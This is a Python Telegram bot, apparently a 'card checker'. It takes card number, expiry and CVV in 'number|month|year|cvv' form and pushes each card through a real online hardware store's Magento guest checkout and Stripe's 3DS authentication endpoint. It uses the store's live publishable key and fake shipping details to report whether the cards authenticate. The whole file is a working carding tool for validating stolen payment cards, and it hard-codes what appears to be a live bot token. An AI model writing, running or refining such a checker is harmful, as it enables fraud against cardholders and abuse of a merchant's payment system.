import os
import json
import logging
import asyncio
import re
from datetime import datetime
from typing import Dict, Optional, Tuple
import httpx
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes
)

# ==================== Configuration ====================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Environment Variables
BOT_TOKEN = os.getenv('BOT_TOKEN', '8166484030:AAHwrm95j131yJxvtlNTAe6S57f5kcfU1ow')
ADMIN_ID = int(os.getenv('ADMIN_ID', '6969592107'))

# ==================== Stripe Checker ====================
class StripeChecker:
    def __init__(self):
        self.base_url = "https://www.ironmongeryworld.com"
        self.stripe_pk = "pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X"
        
        # HTTP Client with timeout
        self.client = httpx.AsyncClient(
            timeout=30.0,
            follow_redirects=True,
            limits=httpx.Limits(max_keepalive_connections=5, max_connections=10)
        )
        
        self.cart_id = None
        self.session_cookies = {}
        
    async def init_session(self) -> bool:
        """Initialize fresh session"""
        try:
            logger.info("🔄 Initializing new session...")
            
            # Get homepage to get cookies
            response = await self.client.get(
                f"{self.base_url}/",
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                }
            )
            
            if response.status_code != 200:
                logger.error(f"❌ Failed to get homepage: {response.status_code}")
                return False
            
            # Extract cookies
            self.session_cookies = dict(response.cookies)
            logger.info(f"✅ Got {len(self.session_cookies)} cookies")
            
            # Get cart ID
            cart_response = await self.client.post(
                f"{self.base_url}/rest/default/V1/guest-carts",
                headers={
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                cookies=self.session_cookies
            )
            
            if cart_response.status_code == 200:
                self.cart_id = cart_response.json()
                logger.info(f"✅ New cart ID: {self.cart_id[:20]}...")
                return True
            else:
                logger.error(f"❌ Failed to create cart: {cart_response.status_code}")
                return False
                
        except Exception as e:
            logger.error(f"❌ Session init failed: {e}")
            return False
    
    async def add_to_cart(self) -> bool:
        """Add product to cart"""
        try:
            if not self.cart_id:
                await self.init_session()
            
            payload = {
                "cartItem": {
                    "sku": "TEMPIMD28",
                    "qty": 1,
                    "quote_id": self.cart_id
                }
            }
            
            response = await self.client.post(
                f"{self.base_url}/rest/default/V1/guest-carts/{self.cart_id}/items",
                json=payload,
                headers={
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                cookies=self.session_cookies
            )
            
            if response.status_code == 200:
                logger.info("✅ Product added to cart")
                return True
            else:
                logger.error(f"❌ Failed to add product: {response.status_code}")
                return False
                
        except Exception as e:
            logger.error(f"❌ Add to cart failed: {e}")
            return False
    
    async def set_shipping(self, address: Dict) -> bool:
        """Set shipping address"""
        try:
            payload = {
                "addressInformation": {
                    "shipping_address": address,
                    "billing_address": address,
                    "shipping_method_code": "matrixrate_1131",
                    "shipping_carrier_code": "matrixrate"
                }
            }
            
            response = await self.client.post(
                f"{self.base_url}/rest/default/V1/guest-carts/{self.cart_id}/shipping-information",
                json=payload,
                headers={
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                cookies=self.session_cookies
            )
            
            if response.status_code == 200:
                logger.info("✅ Shipping set")
                return True
            else:
                logger.error(f"❌ Failed to set shipping: {response.status_code}")
                return False
                
        except Exception as e:
            logger.error(f"❌ Set shipping failed: {e}")
            return False
    
    async def create_payment_method(self, card: Dict) -> Optional[str]:
        """Create Stripe payment method"""
        try:
            data = {
                'type': 'card',
                'card[number]': card['number'],
                'card[exp_month]': card['exp_month'],
                'card[exp_year]': card['exp_year'],
                'card[cvc]': card['cvv'],
                'billing_details[name]': 'Test User',
                'billing_details[email]': 'test@test.com',
                'key': self.stripe_pk
            }
            
            response = await self.client.post(
                'https://api.stripe.com/v1/payment_methods',
                data=data,
                headers={
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            )
            
            if response.status_code == 200:
                result = response.json()
                pm_id = result.get('id')
                logger.info(f"✅ Payment method created: {pm_id}")
                return pm_id
            else:
                logger.error(f"❌ Failed to create PM: {response.status_code}")
                return None
                
        except Exception as e:
            logger.error(f"❌ Create PM failed: {e}")
            return None
    
    async def process_payment(self, pm_id: str, email: str) -> Dict:
        """Process payment and get 3DS"""
        try:
            payload = {
                "cartId": self.cart_id,
                "email": email,
                "paymentMethod": {
                    "method": "stripe_payments",
                    "additional_data": {
                        "payment_method": pm_id
                    }
                }
            }
            
            response = await self.client.post(
                f"{self.base_url}/rest/default/V1/guest-carts/{self.cart_id}/payment-information",
                json=payload,
                headers={
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                cookies=self.session_cookies
            )
            
            if response.status_code == 200:
                result = response.json()
                
                # Extract client_secret
                if 'message' in result and 'pi_' in result['message']:
                    client_secret = result['message'].split(': ')[1]
                    logger.info(f"✅ Got client_secret: {client_secret[:30]}...")
                    return {'status': 'requires_action', 'client_secret': client_secret}
                else:
                    return {'status': 'success', 'message': 'Payment completed'}
            else:
                logger.error(f"❌ Payment failed: {response.status_code}")
                return {'status': 'error', 'message': f'HTTP {response.status_code}'}
                
        except Exception as e:
            logger.error(f"❌ Process payment failed: {e}")
            return {'status': 'error', 'message': str(e)}
    
    async def authenticate_3ds(self, client_secret: str) -> Dict:
        """Authenticate 3DS"""
        try:
            # Get payment intent
            pi_id = client_secret.split('_secret_')[0]
            
            response = await self.client.get(
                f'https://api.stripe.com/v1/payment_intents/{pi_id}',
                params={
                    'client_secret': client_secret,
                    'key': self.stripe_pk
                },
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            )
            
            if response.status_code != 200:
                return {'status': 'error', 'message': 'Failed to get payment intent'}
            
            pi_data = response.json()
            
            # Check if 3DS required
            if pi_data.get('status') != 'requires_action':
                return {'status': 'success', 'message': 'No 3DS required'}
            
            # Get 3DS source
            next_action = pi_data.get('next_action', {})
            use_stripe_sdk = next_action.get('use_stripe_sdk', {})
            source = use_stripe_sdk.get('three_d_secure_2_source')
            
            if not source:
                return {'status': 'error', 'message': 'No 3DS source found'}
            
            # Authenticate
            auth_data = {
                'source': source,
                'browser': json.dumps({
                    "fingerprintAttempted": True,
                    "fingerprintData": None,
                    "challengeWindowSize": None,
                    "threeDSCompInd": "Y",
                    "browserJavaEnabled": False,
                    "browserJavascriptEnabled": True,
                    "browserLanguage": "en-US",
                    "browserColorDepth": "24",
                    "browserScreenHeight": "1080",
                    "browserScreenWidth": "1920",
                    "browserTZ": "-120",
                    "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }),
                'key': self.stripe_pk
            }
            
            auth_response = await self.client.post(
                'https://api.stripe.com/v1/3ds2/authenticate',
                data=auth_data,
                headers={
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            )
            
            if auth_response.status_code == 200:
                auth_result = auth_response.json()
                ares = auth_result.get('ares', {})
                trans_status = ares.get('transStatus', 'U')
                
                status_map = {
                    'Y': '✅ Authenticated',
                    'N': '❌ Not Authenticated',
                    'U': '⚠️ Unable to Authenticate',
                    'A': '🔄 Attempted',
                    'C': '🔄 Challenge Required',
                    'R': '❌ Rejected'
                }
                
                return {
                    'status': 'success',
                    'trans_status': trans_status,
                    'message': status_map.get(trans_status, 'Unknown'),
                    'data': auth_result
                }
            else:
                error_data = auth_response.json()
                return {
                    'status': 'error',
                    'message': error_data.get('error', {}).get('message', 'Authentication failed')
                }
                
        except Exception as e:
            logger.error(f"❌ 3DS auth failed: {e}")
            return {'status': 'error', 'message': str(e)}
    
    async def check_card(self, card: Dict) -> Dict:
        """Main check function"""
        try:
            # 1. Init session
            if not await self.init_session():
                return {'status': 'error', 'message': 'Session init failed'}
            
            # 2. Add to cart
            if not await self.add_to_cart():
                return {'status': 'error', 'message': 'Failed to add product'}
            
            # 3. Set shipping
            address = {
                "countryId": "US",
                "regionId": "12",
                "region": "California",
                "street": ["123 Test St"],
                "telephone": "1234567890",
                "postcode": "90001",
                "city": "Los Angeles",
                "firstname": "Test",
                "lastname": "User"
            }
            
            if not await self.set_shipping(address):
                return {'status': 'error', 'message': 'Failed to set shipping'}
            
            # 4. Create payment method
            pm_id = await self.create_payment_method(card)
            if not pm_id:
                return {'status': 'error', 'message': 'Failed to create payment method'}
            
            # 5. Process payment
            payment_result = await self.process_payment(pm_id, 'test@test.com')
            
            if payment_result['status'] == 'error':
                return payment_result
            
            # 6. Handle 3DS if required
            if payment_result['status'] == 'requires_action':
                client_secret = payment_result['client_secret']
                auth_result = await self.authenticate_3ds(client_secret)
                return auth_result
            
            return payment_result
            
        except Exception as e:
            logger.error(f"❌ Check card failed: {e}")
            return {'status': 'error', 'message': str(e)}
    
    async def close(self):
        """Close HTTP client"""
        await self.client.aclose()

# ==================== Telegram Bot ====================
class TelegramBot:
    def __init__(self):
        self.checker = StripeChecker()
        self.checking = False
        
    def parse_card(self, text: str) -> Optional[Dict]:
        """Parse card from text"""
        try:
            # Remove extra spaces and split
            parts = text.strip().split('|')
            
            if len(parts) < 4:
                return None
            
            card_number = parts[0].strip().replace(' ', '')
            exp_month = parts[1].strip()
            exp_year = parts[2].strip()
            cvv = parts[3].strip()
            
            # Validate
            if not card_number.isdigit() or len(card_number) < 15:
                return None
            
            if not exp_month.isdigit() or not (1 <= int(exp_month) <= 12):
                return None
            
            if not exp_year.isdigit():
                return None
            
            # Fix year format
            if len(exp_year) == 2:
                exp_year = '20' + exp_year
            
            if not cvv.isdigit() or len(cvv) < 3:
                return None
            
            return {
                'number': card_number,
                'exp_month': exp_month,
                'exp_year': exp_year,
                'cvv': cvv
            }
            
        except Exception as e:
            logger.error(f"Parse error: {e}")
            return None
    
    def format_card(self, card: Dict) -> str:
        """Format card for display"""
        number = card['number']
        masked = f"{number[:4]} {number[4:8]} {number[8:12]} {number[12:]}"
        return f"{masked}|{card['exp_month']}|{card['exp_year']}|{card['cvv']}"
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start command"""
        welcome_msg = """
🤖 **Stripe 3DS Checker Bot**

**Commands:**
/start - Show this message
/check - Check a card

**Format:**
`4242424242424242|12|2025|123`

**Status Codes:**
✅ Y - Authenticated
❌ N - Not Authenticated  
⚠️ U - Unable to Authenticate
🔄 A - Attempted
🔄 C - Challenge Required
❌ R - Rejected

**Powered by Railway** 🚀
        """
        await update.message.reply_text(welcome_msg, parse_mode='Markdown')
    
    async def check_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Check command"""
        if self.checking:
            await update.message.reply_text("⏳ Already checking a card. Please wait...")
            return
        
        # Get card from message
        text = update.message.text.replace('/check', '').strip()
        
        if not text:
            await update.message.reply_text(
                "❌ Please provide card details:\n"
                "`/check 4242424242424242|12|2025|123`",
                parse_mode='Markdown'
            )
            return
        
        card = self.parse_card(text)
        
        if not card:
            await update.message.reply_text(
                "❌ Invalid card format!\n\n"
                "**Correct format:**\n"
                "`4242424242424242|12|2025|123`",
                parse_mode='Markdown'
            )
            return
        
        self.checking = True
        
        # Send processing message
        processing_msg = await update.message.reply_text(
            f"🔄 **Checking Card...**\n\n"
            f"💳 `{self.format_card(card)}`\n\n"
            f"⏳ Please wait...",
            parse_mode='Markdown'
        )
        
        try:
            # Check card
            start_time = datetime.now()
            result = await self.checker.check_card(card)
            elapsed = (datetime.now() - start_time).total_seconds()
            
            # Format result
            if result['status'] == 'success':
                trans_status = result.get('trans_status', 'Unknown')
                message = result.get('message', 'Success')
                
                status_emoji = {
                    'Y': '✅',
                    'N': '❌',
                    'U': '⚠️',
                    'A': '🔄',
                    'C': '🔄',
                    'R': '❌'
                }.get(trans_status, '❓')
                
                response = (
                    f"{status_emoji} **Result**\n\n"
                    f"💳 `{self.format_card(card)}`\n\n"
                    f"**Status:** {message}\n"
                    f"**Code:** `{trans_status}`\n"
                    f"**Time:** {elapsed:.2f}s\n\n"
                    f"**Checked by:** @{update.effective_user.username or 'Unknown'}"
                )
            else:
                response = (
                    f"❌ **Check Failed**\n\n"
                    f"💳 `{self.format_card(card)}`\n\n"
                    f"**Error:** {result.get('message', 'Unknown error')}\n"
                    f"**Time:** {elapsed:.2f}s"
                )
            
            await processing_msg.edit_text(response, parse_mode='Markdown')
            
        except Exception as e:
            logger.error(f"Check error: {e}")
            await processing_msg.edit_text(
                f"❌ **Error**\n\n"
                f"💳 `{self.format_card(card)}`\n\n"
                f"**Message:** {str(e)}",
                parse_mode='Markdown'
            )
        
        finally:
            self.checking = False
    
    async def message_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle card messages"""
        text = update.message.text.strip()
        
        # Check if it's a card
        card = self.parse_card(text)
        
        if card:
            # Treat as /check command
            update.message.text = f"/check {text}"
            await self.check_command(update, context)
        else:
            await update.message.reply_text(
                "❌ Invalid format!\n\n"
                "**Send card as:**\n"
                "`4242424242424242|12|2025|123`\n\n"
                "Or use `/check` command",
                parse_mode='Markdown'
            )
    
    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle errors"""
        logger.error(f"Update {update} caused error {context.error}")
        
        if update and update.effective_message:
            await update.effective_message.reply_text(
                "❌ An error occurred. Please try again."
            )
    
    async def post_init(self, application: Application):
        """Post initialization"""
        logger.info("✅ Bot initialized")
    
    async def post_shutdown(self, application: Application):
        """Post shutdown"""
        await self.checker.close()
        logger.info("✅ Bot shutdown")
    
    def run(self):
        """Run bot"""
        logger.info("=" * 70)
        logger.info("🤖 Starting Stripe 3DS Telegram Bot")
        logger.info("🔄 With Auto Cart Refresh System")
        logger.info("✅ Fixed R (Rejected) Status Detection")
        logger.info("⚡️ Using /v1/3ds2/authenticate endpoint")
        logger.info("=" * 70)
        
        # Create application
        application = (
            Application.builder()
            .token(BOT_TOKEN)
            .post_init(self.post_init)
            .post_shutdown(self.post_shutdown)
            .build()
        )
        
        # Add handlers
        application.add_handler(CommandHandler("start", self.start_command))
        application.add_handler(CommandHandler("check", self.check_command))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.message_handler))
        application.add_error_handler(self.error_handler)
        
        logger.info("✅ All handlers registered")
        logger.info("🚀 Bot is running and listening...")
        logger.info("=" * 70)
        
        # Run bot
        application.run_polling(
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True
        )

# ==================== Main ====================
def main():
    """Main function"""
    try:
        bot = TelegramBot()
        bot.run()
    except KeyboardInterrupt:
        logger.info("👋 Bot stopped by user")
    except Exception as e:
        logger.error(f"❌ Fatal error: {e}")
        raise

if __name__ == '__main__':
    main()
